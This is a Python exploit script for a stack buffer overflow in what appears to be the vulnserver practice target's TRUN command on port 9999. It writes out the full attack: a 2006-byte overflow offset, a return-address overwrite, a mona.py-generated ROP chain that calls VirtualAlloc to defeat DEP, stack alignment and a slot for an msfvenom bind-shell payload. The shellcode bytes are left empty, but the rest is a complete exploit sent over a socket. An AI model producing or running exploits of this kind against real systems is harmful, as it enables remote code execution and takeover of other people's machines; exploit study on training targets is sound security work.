#!/usr/bin/python

import socket
import struct

HOST = 'Victimmachine'
PORT = 9999


def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x402c53ef,  # POP ECX # RETN [LPK.dll] ** ASLR 
      0x6c881298,  # ptr to &VirtualAlloc() [IAT mswsock.dll] ** ASLR
      0x709afd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x6ff5c4c5,  # POP EBP # RETN [msvcrt.dll] ** ASLR 
      0x625011af,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77bec3b9,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x77c3dae9,  # NEG EAX # RETN [RPCRT4.dll] ** ASLR 
      0x77c38e46,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x77bec3b9,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0xa1bf4fcd,  # put delta into eax (-> put 0x00001000 into edx)
      0x77b9d011,  # ADD EAX,5E40C033 # RETN [GDI32.dll] ** ASLR 
      0x77bdb0c9,  # XCHG EAX,EDX # RETN [RPCRT4.dll] ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77bec3e9,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77d43193,  # NEG EAX # RETN [user32.dll] ** ASLR 
      0x77c390e7,  # XCHG EAX,ECX # RETN [RPCRT4.dll] ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x6ff61ebd,  # POP EDI # RETN [msvcrt.dll] ** ASLR 
      0x77bd1645,  # RETN (ROP NOP) [RPCRT4.dll] ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x77e8784c,  # POP EAX # RETN [kernel32.dll] ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77be2795,  # PUSHAD # RETN [RPCRT4.dll] ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


# msfvenom -p windows/shell_bind_tcp -f python -v SHELL -b '\x00'
SHELL =  b""
SHELL += b""

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    create_rop_chain() +
    # Align stack
    b'\x83\xE4\xF0' +   # and esp, 0xfffffff0
    SHELL +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
